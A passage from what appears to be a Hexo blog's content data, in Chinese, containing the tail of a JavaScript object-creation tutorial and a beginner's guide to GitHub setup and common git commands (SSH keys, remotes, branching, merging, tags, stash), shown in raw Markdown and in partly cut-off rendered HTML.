混合模式\"></a>5. 混合模式</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Hero</span> (<span class=\"params\">name, skill</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.skill = skill;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Hero.prototype = &#123;</span><br><span class=\"line\">    skillLists: [<span class=\"string\">'Q'</span>, <span class=\"string\">'W'</span>, <span class=\"string\">'E'</span>, <span class=\"string\">'R'</span>];</span><br><span class=\"line\">    sayName: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        alert(<span class=\"keyword\">this</span>.name);</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"keyword\">do</span>: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        alert(<span class=\"keyword\">this</span>.name + <span class=\"string\">' use '</span> + <span class=\"keyword\">this</span>.skill + <span class=\"string\">' kill '</span> + <span class=\"string\">'MasterYi'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> p1 = <span class=\"keyword\">new</span> Hero(<span class=\"string\">'yasuo'</span>, <span class=\"string\">'R'</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> p2 = <span class=\"keyword\">new</span> Hero(<span class=\"string\">'ashe'</span>, <span class=\"string\">'w'</span>);</span><br><span class=\"line\">p1.sayName();   <span class=\"comment\">// yasuo</span></span><br><span class=\"line\">p1.skillLists;  <span class=\"comment\">// ['Q', 'W', 'E', 'R']</span></span><br><span class=\"line\">p2.do();        <span class=\"comment\">// ashe use w kill MasterYi</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"6-使用class关键字\"><a href=\"#6-使用class关键字\" class=\"headerlink\" title=\"6. 使用class关键字\"></a>6. 使用<code>class</code>关键字</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Hero</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>()&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.name = <span class=\"string\">'MasterYi'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.skill = <span class=\"string\">'AlphaStrike'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">do</span>(enemy)&#123;</span><br><span class=\"line\">        alert(<span class=\"keyword\">this</span>.name + <span class=\"string\">' use '</span> +  <span class=\"keyword\">this</span>.skill + <span class=\"string\">' kill '</span> + enemy)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> ashe = <span class=\"keyword\">new</span> Hero();</span><br><span class=\"line\">ashe.do(<span class=\"string\">'ashe'</span>);       <span class=\"comment\">// MasterYi use AlphaStrike kill ashe</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Yasuo</span> <span class=\"keyword\">extends</span> <span class=\"title\">Hero</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>()&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>()</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.name = <span class=\"string\">'yasuo'</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> yasuo = <span class=\"keyword\">new</span> Yasuo();</span><br><span class=\"line\">yasuo.do(<span class=\"string\">'timor'</span>);      <span class=\"comment\">// yasuo use AlphaStrike kill timor</span></span><br></pre></td></tr></table></figure>\n<p>这里涉及到 <code>ES6</code> 里的新特性，想了解 <code>ES6</code> 中更多的新特性，大家可以去看看 <a href=\"http://es6.ruanyifeng.com/\" target=\"_blank\" rel=\"noopener\">阮一峰</a> 老师的博客。</p>\n"},{"id":"0809011","title":"代码托管与常用的 git 命令","date":"2017-07-14T08:08:25.000Z","_content":"\n- github是一个基于git的代码托管平台，付费用户可以建私人仓库，我们一般的免费用户只能使用公共仓库，也就是代码要公开。\n\n- github由Chris Wanstrath, PJ Hyett 与Tom Preston-Werner三位开发者在2008年4月创办。迄今拥有59名全职员工，主要提供基于git的`版本托管`服务。\n\n#### <a>1、注册账号和创建仓库</a>\n\n1. 要想使用github第一步当然是注册github账号了， github官网地址：[https://github.com/](https://github.com/)。 之后就可以创建仓库了（免费用户只能建公共仓库），点击右上角头像，再点击 `Your profile`，进入`Repository`，点击`New`，之后会出现一些仓库的配置信息：\n<img src=\"/images/github1.png\">\n\n2. 之后会进入配置界面，依次填写仓库的基本信息，然后点击`Creat Repository`，正式创建一个代码仓库：\n<img src=\"/images/github2.png\">\n\n3. 配置完成之后，会进入到仓库里面，让我们一探究竟吧：\n<img src=\"/images/github3.png\">\n\n> 基本创建工作完成，后面就是用ssh链接到我们的仓库啦，这时我们就会用到 `git-bash` 这个工具啦，继续往下看。\n\n#### <a>2、git</a>\n\n> 下载安装 `Git`：\n\n- 下载 [git OSX](https://sourceforge.net/projects/git-osx-installer/files/git-2.16.2-intel-universal-mavericks.dmg/download?use_mirror=autoselect) 版\n- 下载 [git Windows](https://git-scm.com/download/win) 版\n- 下载 [git Linux](https://git-scm.com/download/linux) 版\n- 或者可以进入 [GIT 官网](https://git-scm.com/downloads) 下载适合自己的版本\n\n> 配置 `Git`：\n\n1. 首先在本地创建 `ssh key` ，运行命令：\n```bash\n# 这里填写你的邮箱地址\n$ ssh-keygen -t rsa -C \"your_email@youremail.com\"\n```\n\n2. 后面的your_email@youremail.com改为你在github上注册的邮箱，之后会要求确认路径和输入密码，我们这使用默认的一路回车就行。成功的话会在~/下生成.ssh文件夹，进去，打开id_rsa.pub，复制里面的key。\n\n3. 回到github上，进入 Settings（账户配置），左边选择SSH and GPG keys，点击New SSH Key，title随便填，粘贴在你电脑上生成的key。\n<img src=\"/images/github4.png\">\n\n4. 为了验证是否成功，在git bash下输入：\n```bash\n$ ssh -T git@github.com\n```\n  如果是第一次的会提示是否continue，输入yes就会看到：You've successfully authenticated, but GitHub does not provide shell access 。这就表示已成功连上github。\n  \n5. 接下来我们要做的就是把本地仓库传到github上去，在此之前还需要设置username和email，因为github每次commit都会记录他们：\n```bash\n$ git config --global user.name \"your name\"\n$ git config --global user.email \"your_email@youremail.com\"\n```\n\n6. 进入要上传的仓库，右键git bash here，添加远程地址：\n```bash\n# git remote add origin git@github.com:yushengyuan1993/test.git\n$ git remote add origin git@github.com:yourName/yourRepo.git\n```\n  后面的yourName和yourRepo表示你再github的用户名和刚才新建的仓库，加完之后进入.git，打开config，这里会多出一个remote \"origin\"内容，这就是刚才添加的远程地址，也可以直接修改config来配置远程地址。\n\n7. 创建新文件夹，打开，然后执行 git init 以创建新的 git 仓库。\n\n#### <a>3、克隆仓库</a>\n\n- 执行如下命令以创建一个本地仓库的克隆版本：\n```bash\n$ git clone /path/to/repository \n```\n\n- 如果是远程服务器上的仓库，你的命令会是这个样子：\n```bash\n$ git clone username@host:/path/to/repository\n```\n\n#### <a>4、Git命令</a>\n\n> 你的本地仓库由 git 维护的三棵\"树\"组成。第一个是你的 工作目录，它持有实际文件；第二个是 暂存区（Index），它像个缓存区域，临时保存你的改动；最后是 HEAD，它指向你最后一次提交的结果。\n\n1. `工作流：`\n  - 你可以提出更改（把它们添加到暂存区），使用如下命令：\n  ```bash\n  $ git add <filename>\n  git add *\n  ```\n  - 这是 git 基本工作流程的第一步；使用如下命令以实际提交改动：\n  ```bash\n  $ git commit -m \"代码提交信息\"\n  ```\n    现在，你的改动已经提交到了 HEAD，但是还没到你的远端仓库。\n\n2. `推送改动：`\n  - 你的改动现在已经在本地仓库的 HEAD 中了。执行如下命令以将这些改动提交到远端仓库：\n  ```bash\n  # 推送改动到 master 分支，实际开发中很少会直接推送到master上，\n  # 一般都是推到开发分支，再由leader推到master\n  $ git push origin master\n  ```\n    可以把 master 换成你想要推送的任何分支。 \n\n  - 如果你还没有克隆现有仓库，并欲将你的仓库连接到某个远程服务器，你可以使用如下命令添加：\n  ```bash\n  $ git remote add origin <server>\n  ```\n    如此你就能够将你的改动推送到所添加的服务器上去了。\n\n3. `分支：`\n  - 分支是用来将特性开发绝缘开来的。在你创建仓库的时候，master 是\"默认的\"分支。在其他分支上进行开发，完成后再将它们合并到主分支上。\n\n  - 创建一个叫做\"feature_x\"的分支，并切换过去：\n  ```bash\n  $ git checkout -b feature_x\n  ```\n  - 切换回主分支：\n  ```bash\n  $ git checkout master\n  ```\n  - 再把新建的分支删掉：\n  ```bash\n  $ git branch -d feature_x\n  ```\n  - 除非你将分支推送到远端仓库，不然该分支就是不为他人所见的：\n  ```bash\n  $ git push origin <branch>\n  ```\n\n4. `更新与合并：`\n  - 要更新你的本地仓库至最新改动，执行：\n  ```bash\n  $ git pull\n  ```\n  - 以在你的工作目录中 `获取（fetch）` 并 `合并（merge）` 远端的改动。\n  - 要合并其他分支到你的当前分支（例如 master），执行：\n  ```bash\n  $ git merge <branch>\n  ```\n  - 在这两种情况下，git 都会尝试去自动合并改动。遗憾的是，这可能并非每次都成功，并可能出现冲突（conflicts）。 这时候就需要你修改这些文件来手动合并这些冲突（conflicts）。改完之后，你需要执行如下命令以将它们标记为合并成功：\n  ```bash\n  $ git add <filename>\n  ```\n  - 在合并改动之前，你可以使用如下命令预览差异：\n  ```bash\n  $ git diff <source_branch> <target_branch>\n  ```\n\n5. `标签：`\n  - 为软件发布创建标签是推荐的。这个概念早已存在，在 `SVN` 中也有。你可以执行如下命令创建一个叫做 `1.0.0` 的标签：\n  ```bash\n  $ git tag 1.0.0 1b2e1d63ff\n  ```\n  - `1b2e1d63ff` 是你想要标记的提交 `ID` 的前 `10` 位字符。可以使用下列命令获取提交 `ID`：\n  ```bash\n  $ git log\n  ```\n  - 你也可以使用少一点的提交 ID 前几位，只要它的指向具有唯一性。\n\n6. `替换本地改动：`\n  - 假如你操作失误（当然，这最好永远不要发生），你可以使用如下命令替换掉本地改动：\n  ```bash\n  $ git checkout -- <filename>\n  ```\n  - 此命令会使用 HEAD 中的最新内容替换掉你的工作目录中的文件。已添加到暂存区的改动以及新文件都不会受到影响。\n  - 假如你想丢弃你在本地的所有改动与提交，可以到服务器上获取最新的版本历史，并将你本地主分支指向它：\n  ```bash\n  $ git fetch origin\n  $ git reset --hard origin/master\n  ```\n\n7. `实用小贴士：`\n  - 内建的图形化 `git`：\n  ```bash\n  $ gitk\n  ```\n  - 彩色的 `git` 输出：\n  ```bash\n  $ git config color.ui true\n  ```\n  - 显示历史记录时，每个提交的信息只显示一行：\n  ```bash\n  $ git config format.pretty oneline\n  ```\n  - 交互式添加文件到暂存区：\n  ```bash\n  $ git add -i\n  ```\n  - 设置 `git` 命令别名：\n  ```bash\n  $ git config --global alias.st status     # 把status 别名设置为 st\n  $ git config --global alias.cm commit     # 把commit 别名设置为 cm\n  $ git config --global alias.br branch     # 把branch 别名设置为 br\n  $ git config --global alias.co checkout   # 把checkout 别名设置为 co\n  ```\n  - `git show` 命令：\n  ```bash\n  $ git show commitId           # 查看这次提交具体修改的内容\n  $ git show stashId            # 查看stash的一些基本信息\n  $ git show commitId fileName  # 查看某一个文件在某一次提交中的修改\n  ```\n  - `git stash` 命令：\n  ```bash\n  $ git stash                   # 隐藏当前正在进行的工作\n  $ git stash list              # 列出所有stash\n  $ git stash apply stashId     # 拉取某次的stash\n  $ git stash drop stashId      # 移除某个stash\n  $ git stash pop               #  抽取上一次的stash到工作空间\n  $ git stash clear             # 清除所有的stash\n  ```\n\n  - 把本地代码推送到远程仓库：\n  ```sh\n  # 1、初始化版本库\n  $ git init\n\n  # 添加文件到版本库（只是添加到缓存区），.代表添加文件夹下所有文件 \n  $ git add .\n\n  # 把添加的文件提交到版本库，并填写提交备注\n  $ git commit -m \"first commit\"\n\n  # 2、到目前为止，我们完成了代码库的初始化，但代码是在本地，还没有提交到远程服务器，所以关键的来了，\n  # 要提交到就远程代码服务器，进行以下两步：\n  $ git remote add origin `remote repository`  # 把本地库与远程库关联\n\n  $ git push -u origin master                  # 第一次推送时\n\n  $ git push origin master                     # 第一次推送后，直接使用该命令即可推送修改\n  ```\n\n<p style=\"text-align: right\">`参考文档` [git-scm](https://git-scm.com/book/zh/v2)</p>","source":"_posts/0809011_代码托管与常用的git命令.md","raw":"---\nid: 0809011\ntitle: 代码托管与常用的 git 命令\ndate: 2017-07-14 16:08:25\ntags:\n  - GIT\n  - github\ncategories:\n---\n\n- github是一个基于git的代码托管平台，付费用户可以建私人仓库，我们一般的免费用户只能使用公共仓库，也就是代码要公开。\n\n- github由Chris Wanstrath, PJ Hyett 与Tom Preston-Werner三位开发者在2008年4月创办。迄今拥有59名全职员工，主要提供基于git的`版本托管`服务。\n\n#### <a>1、注册账号和创建仓库</a>\n\n1. 要想使用github第一步当然是注册github账号了， github官网地址：[https://github.com/](https://github.com/)。 之后就可以创建仓库了（免费用户只能建公共仓库），点击右上角头像，再点击 `Your profile`，进入`Repository`，点击`New`，之后会出现一些仓库的配置信息：\n<img src=\"/images/github1.png\">\n\n2. 之后会进入配置界面，依次填写仓库的基本信息，然后点击`Creat Repository`，正式创建一个代码仓库：\n<img src=\"/images/github2.png\">\n\n3. 配置完成之后，会进入到仓库里面，让我们一探究竟吧：\n<img src=\"/images/github3.png\">\n\n> 基本创建工作完成，后面就是用ssh链接到我们的仓库啦，这时我们就会用到 `git-bash` 这个工具啦，继续往下看。\n\n#### <a>2、git</a>\n\n> 下载安装 `Git`：\n\n- 下载 [git OSX](https://sourceforge.net/projects/git-osx-installer/files/git-2.16.2-intel-universal-mavericks.dmg/download?use_mirror=autoselect) 版\n- 下载 [git Windows](https://git-scm.com/download/win) 版\n- 下载 [git Linux](https://git-scm.com/download/linux) 版\n- 或者可以进入 [GIT 官网](https://git-scm.com/downloads) 下载适合自己的版本\n\n> 配置 `Git`：\n\n1. 首先在本地创建 `ssh key` ，运行命令：\n```bash\n# 这里填写你的邮箱地址\n$ ssh-keygen -t rsa -C \"your_email@youremail.com\"\n```\n\n2. 后面的your_email@youremail.com改为你在github上注册的邮箱，之后会要求确认路径和输入密码，我们这使用默认的一路回车就行。成功的话会在~/下生成.ssh文件夹，进去，打开id_rsa.pub，复制里面的key。\n\n3. 回到github上，进入 Settings（账户配置），左边选择SSH and GPG keys，点击New SSH Key，title随便填，粘贴在你电脑上生成的key。\n<img src=\"/images/github4.png\">\n\n4. 为了验证是否成功，在git bash下输入：\n```bash\n$ ssh -T git@github.com\n```\n  如果是第一次的会提示是否continue，输入yes就会看到：You've successfully authenticated, but GitHub does not provide shell access 。这就表示已成功连上github。\n  \n5. 接下来我们要做的就是把本地仓库传到github上去，在此之前还需要设置username和email，因为github每次commit都会记录他们：\n```bash\n$ git config --global user.name \"your name\"\n$ git config --global user.email \"your_email@youremail.com\"\n```\n\n6. 进入要上传的仓库，右键git bash here，添加远程地址：\n```bash\n# git remote add origin git@github.com:yushengyuan1993/test.git\n$ git remote add origin git@github.com:yourName/yourRepo.git\n```\n  后面的yourName和yourRepo表示你再github的用户名和刚才新建的仓库，加完之后进入.git，打开config，这里会多出一个remote \"origin\"内容，这就是刚才添加的远程地址，也可以直接修改config来配置远程地址。\n\n7. 创建新文件夹，打开，然后执行 git init 以创建新的 git 仓库。\n\n#### <a>3、克隆仓库</a>\n\n- 执行如下命令以创建一个本地仓库的克隆版本：\n```bash\n$ git clone /path/to/repository \n```\n\n- 如果是远程服务器上的仓库，你的命令会是这个样子：\n```bash\n$ git clone username@host:/path/to/repository\n```\n\n#### <a>4、Git命令</a>\n\n> 你的本地仓库由 git 维护的三棵\"树\"组成。第一个是你的 工作目录，它持有实际文件；第二个是 暂存区（Index），它像个缓存区域，临时保存你的改动；最后是 HEAD，它指向你最后一次提交的结果。\n\n1. `工作流：`\n  - 你可以提出更改（把它们添加到暂存区），使用如下命令：\n  ```bash\n  $ git add <filename>\n  git add *\n  ```\n  - 这是 git 基本工作流程的第一步；使用如下命令以实际提交改动：\n  ```bash\n  $ git commit -m \"代码提交信息\"\n  ```\n    现在，你的改动已经提交到了 HEAD，但是还没到你的远端仓库。\n\n2. `推送改动：`\n  - 你的改动现在已经在本地仓库的 HEAD 中了。执行如下命令以将这些改动提交到远端仓库：\n  ```bash\n  # 推送改动到 master 分支，实际开发中很少会直接推送到master上，\n  # 一般都是推到开发分支，再由leader推到master\n  $ git push origin master\n  ```\n    可以把 master 换成你想要推送的任何分支。 \n\n  - 如果你还没有克隆现有仓库，并欲将你的仓库连接到某个远程服务器，你可以使用如下命令添加：\n  ```bash\n  $ git remote add origin <server>\n  ```\n    如此你就能够将你的改动推送到所添加的服务器上去了。\n\n3. `分支：`\n  - 分支是用来将特性开发绝缘开来的。在你创建仓库的时候，master 是\"默认的\"分支。在其他分支上进行开发，完成后再将它们合并到主分支上。\n\n  - 创建一个叫做\"feature_x\"的分支，并切换过去：\n  ```bash\n  $ git checkout -b feature_x\n  ```\n  - 切换回主分支：\n  ```bash\n  $ git checkout master\n  ```\n  - 再把新建的分支删掉：\n  ```bash\n  $ git branch -d feature_x\n  ```\n  - 除非你将分支推送到远端仓库，不然该分支就是不为他人所见的：\n  ```bash\n  $ git push origin <branch>\n  ```\n\n4. `更新与合并：`\n  - 要更新你的本地仓库至最新改动，执行：\n  ```bash\n  $ git pull\n  ```\n  - 以在你的工作目录中 `获取（fetch）` 并 `合并（merge）` 远端的改动。\n  - 要合并其他分支到你的当前分支（例如 master），执行：\n  ```bash\n  $ git merge <branch>\n  ```\n  - 在这两种情况下，git 都会尝试去自动合并改动。遗憾的是，这可能并非每次都成功，并可能出现冲突（conflicts）。 这时候就需要你修改这些文件来手动合并这些冲突（conflicts）。改完之后，你需要执行如下命令以将它们标记为合并成功：\n  ```bash\n  $ git add <filename>\n  ```\n  - 在合并改动之前，你可以使用如下命令预览差异：\n  ```bash\n  $ git diff <source_branch> <target_branch>\n  ```\n\n5. `标签：`\n  - 为软件发布创建标签是推荐的。这个概念早已存在，在 `SVN` 中也有。你可以执行如下命令创建一个叫做 `1.0.0` 的标签：\n  ```bash\n  $ git tag 1.0.0 1b2e1d63ff\n  ```\n  - `1b2e1d63ff` 是你想要标记的提交 `ID` 的前 `10` 位字符。可以使用下列命令获取提交 `ID`：\n  ```bash\n  $ git log\n  ```\n  - 你也可以使用少一点的提交 ID 前几位，只要它的指向具有唯一性。\n\n6. `替换本地改动：`\n  - 假如你操作失误（当然，这最好永远不要发生），你可以使用如下命令替换掉本地改动：\n  ```bash\n  $ git checkout -- <filename>\n  ```\n  - 此命令会使用 HEAD 中的最新内容替换掉你的工作目录中的文件。已添加到暂存区的改动以及新文件都不会受到影响。\n  - 假如你想丢弃你在本地的所有改动与提交，可以到服务器上获取最新的版本历史，并将你本地主分支指向它：\n  ```bash\n  $ git fetch origin\n  $ git reset --hard origin/master\n  ```\n\n7. `实用小贴士：`\n  - 内建的图形化 `git`：\n  ```bash\n  $ gitk\n  ```\n  - 彩色的 `git` 输出：\n  ```bash\n  $ git config color.ui true\n  ```\n  - 显示历史记录时，每个提交的信息只显示一行：\n  ```bash\n  $ git config format.pretty oneline\n  ```\n  - 交互式添加文件到暂存区：\n  ```bash\n  $ git add -i\n  ```\n  - 设置 `git` 命令别名：\n  ```bash\n  $ git config --global alias.st status     # 把status 别名设置为 st\n  $ git config --global alias.cm commit     # 把commit 别名设置为 cm\n  $ git config --global alias.br branch     # 把branch 别名设置为 br\n  $ git config --global alias.co checkout   # 把checkout 别名设置为 co\n  ```\n  - `git show` 命令：\n  ```bash\n  $ git show commitId           # 查看这次提交具体修改的内容\n  $ git show stashId            # 查看stash的一些基本信息\n  $ git show commitId fileName  # 查看某一个文件在某一次提交中的修改\n  ```\n  - `git stash` 命令：\n  ```bash\n  $ git stash                   # 隐藏当前正在进行的工作\n  $ git stash list              # 列出所有stash\n  $ git stash apply stashId     # 拉取某次的stash\n  $ git stash drop stashId      # 移除某个stash\n  $ git stash pop               #  抽取上一次的stash到工作空间\n  $ git stash clear             # 清除所有的stash\n  ```\n\n  - 把本地代码推送到远程仓库：\n  ```sh\n  # 1、初始化版本库\n  $ git init\n\n  # 添加文件到版本库（只是添加到缓存区），.代表添加文件夹下所有文件 \n  $ git add .\n\n  # 把添加的文件提交到版本库，并填写提交备注\n  $ git commit -m \"first commit\"\n\n  # 2、到目前为止，我们完成了代码库的初始化，但代码是在本地，还没有提交到远程服务器，所以关键的来了，\n  # 要提交到就远程代码服务器，进行以下两步：\n  $ git remote add origin `remote repository`  # 把本地库与远程库关联\n\n  $ git push -u origin master                  # 第一次推送时\n\n  $ git push origin master                     # 第一次推送后，直接使用该命令即可推送修改\n  ```\n\n<p style=\"text-align: right\">`参考文档` [git-scm](https://git-scm.com/book/zh/v2)</p>","slug":"0809011_代码托管与常用的git命令","published":1,"updated":"2018-03-28T09:32:50.843Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjfhshvtf0009s4c0pesz5deg","content":"<ul>\n<li><p>github是一个基于git的代码托管平台，付费用户可以建私人仓库，我们一般的免费用户只能使用公共仓库，也就是代码要公开。</p>\n</li>\n<li><p>github由Chris Wanstrath, PJ Hyett 与Tom Preston-Werner三位开发者在2008年4月创办。迄今拥有59名全职员工，主要提供基于git的<code>版本托管</code>服务。</p>\n</li>\n</ul>\n<h4 id=\"1、注册账号和创建仓库\"><a href=\"#1、注册账号和创建仓库\" class=\"headerlink\" title=\"1、注册账号和创建仓库\"></a><a>1、注册账号和创建仓库</a></h4><ol>\n<li><p>要想使用github第一步当然是注册github账号了， github官网地址：<a href=\"https://github.com/\" target=\"_blank\" rel=\"noopener\">https://github.com/</a>。 之后就可以创建仓库了（免费用户只能建公共仓库），点击右上角头像，再点击 <code>Your profile</code>，进入<code>Repository</code>，点击<code>New</code>，之后会出现一些仓库的配置信息：<br><img src=\"/images/github1.png\"></p>\n</li>\n<li><p>之后会进入配置界面，依次填写仓库的基本信息，然后点击<code>Creat Repository</code>，正式创建一个代码仓库：<br><img src=\"/images/github2.png\"></p>\n</li>\n<li><p>配置完成之后，会进入到仓库里面，让我们一探究竟吧：<br><img src=\"/images/github3.png\"></p>\n</li>\n</ol>\n<blockquote>\n<p>基本创建工作完成，后面就是用ssh链接到我们的仓库啦，这时我们就会用到 <code>git-bash</code> 这个工具啦，继续往下看。</p>\n</blockquote>\n<h4 id=\"2、git\"><a href=\"#2、git\" class=\"headerlink\" title=\"2、git\"></a><a>2、git</a></h4><blockquote>\n<p>下载安装 <code>Git</code>：</p>\n</blockquote>\n<ul>\n<li>下载 <a href=\"https://sourceforge.net/projects/git-osx-installer/files/git-2.16.2-intel-universal-mavericks.dmg/download?use_mirror=autoselect\" target=\"_blank\" rel=\"noopener\">git OSX</a> 版</li>\n<li>下载 <a href=\"https://git-scm.com/download/win\" target=\"_blank\" rel=\"noopener\">git Windows</a> 版</li>\n<li>下载 <a href=\"https://git-scm.com/download/linux\" target=\"_blank\" rel=\"noopener\">git Linux</a> 版</li>\n<li>或者可以进入 <a href=\"https://git-scm.com/downloads\" target=\"_blank\" rel=\"noopener\">GIT 官网</a> 下载适合自己的版本</li>\n</ul>\n<blockquote>\n<p>配置 <code>Git</code>：</p>\n</blockquote>\n<ol>\n<li><p>首先在本地创建 <code>ssh key</code> ，运行命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 这里填写你的邮箱地址</span></span><br><span class=\"line\">$ ssh-keygen -t rsa -C <span class=\"string\">\"your_email@youremail.com\"</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>后面的your_email@youremail.com改为你在github上注册的邮箱，之后会要求确认路径和输入密码，我们这使用默认的一路回车就行。成功的话会在~/下生成.ssh文件夹，进去，打开id_rsa.pub，复制里面的key。</p>\n</li>\n<li><p>回到github上，进入 Settings（账户配置），左边选择SSH and GPG keys，点击New SSH Key，title随便填，粘贴在你电脑上生成的key。<br><img src=\"/images/github4.png\"></p>\n</li>\n<li><p>为了验证是否成功，在git bash下输入：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ssh -T git@github.com</span><br></pre></td></tr></table></figure>\n<p>如果是第一次的会提示是否continue，输入yes就会看到：You’ve successfully authenticated, but GitHub does not provide shell access 。这就表示已成功连上github。</p>\n</li>\n<li><p>接下来我们要做的就是把本地仓库传到github上去，在此之前还需要设置username和email，因为github每次commit都会记录他们：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git config --global user.name <span class=\"string\">\"your name\"</span></span><br><span class=\"line\">$ git config --global user.email <span class=\"string\">\"your_email@youremail.com\"</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>进入要上传的仓库，右键git bash here，添加远程地址：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># git remote add origin git@github.com:yushengyuan1993/test.git</span></span><br><span class=\"line\">$ git remote add origin git@github.com:yourName/yourRepo.git</span><br></pre></td></tr></table></figure>\n<p>后面的yourName和yourRepo表示你再github的用户名和刚才新建的仓库，加完之后进入.git，打开config，这里会多出一个remote “origin”内容，这就是刚才添加的远程地址，也可以直接修改config来配置远程地址。</p>\n</li>\n<li><p>创建新文件夹，打开，然后执行 git init 以创建新的 git 仓库。</p>\n</li>\n</ol>\n<h4 id=\"3、克隆仓库\"><a href=\"#3、克隆仓库\" class=\"headerlink\" title=\"3、克隆仓库\"></a><a>3、克隆仓库</a></h4><ul>\n<li><p>执行如下命令以创建一个本地仓库的克隆版本：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git <span class=\"built_in\">clone</span> /path/to/repository</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>如果是远程服务器上的仓库，你的命令会是这个样子：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git <span class=\"built_in\">clone</span> username@host:/path/to/repository</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"4、Git命令\"><a href=\"#4、Git命令\" class=\"headerlink\" title=\"4、Git命令\"></a><a>4、Git命令</a></h4><blockquote>\n<p>你的本地仓库由 git 维护的三棵”树”组成。第一个是你的 工作目录，它持有实际文件；第二个是 暂存区（Index），它像个缓存区域，临时保存你的改动；最后是 HEAD，它指向你最后一次提交的结果。</p>\n</blockquote>\n<ol>\n<li><p><code>工作流：</code></p>\n<ul>\n<li><p>你可以提出更改（把它们添加到暂存区），使用如下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git add &lt;filename&gt;</span><br><span class=\"line\">git add *</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>这是 git 基本工作流程的第一步；使用如下命令以实际提交改动：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git commit -m <span class=\"string\">\"代码提交信息\"</span></span><br></pre></td></tr></table></figure>\n<p>现在，你的改动已经提交到了 HEAD，但是还没到你的远端仓库。</p>\n</li>\n</ul>\n</li>\n<li><p><code>推送改动：</code></p>\n<ul>\n<li><p>你的改动现在已经在本地仓库的 HEAD 中了。执行如下命令以将这些改动提交到远端仓库：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 推送改动到 master 分支，实际开发中很少会直接推送到master上，</span></span><br><span class=\"line\"><span 